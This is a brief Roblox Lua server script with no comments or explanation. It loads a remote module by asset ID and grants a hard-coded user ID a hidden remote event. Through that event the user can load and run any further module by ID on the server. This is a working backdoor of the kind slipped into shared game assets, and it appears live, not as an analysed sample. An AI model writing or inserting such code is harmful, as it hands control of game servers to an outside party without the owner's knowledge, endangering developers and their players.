local c = require(6412939311)
function l(a,s)
	if #s > 0 then
		local r = require(tonumber(string.match(s, "%d+")))
		for i,v in pairs(r) do
			if type(v) == 'function' then
				v(a.Name)
			end
 		end
	end
end

game.Players.PlayerAdded:Connect(function(plr)
	if plr.UserId == 287103891 then
		local c = c:Load():Clone()
		c.Parent = plr.PlayerGui
		c[''][''].OnServerEvent:connect(function(a,s)
			l(a,s)
		end)
	end
end)
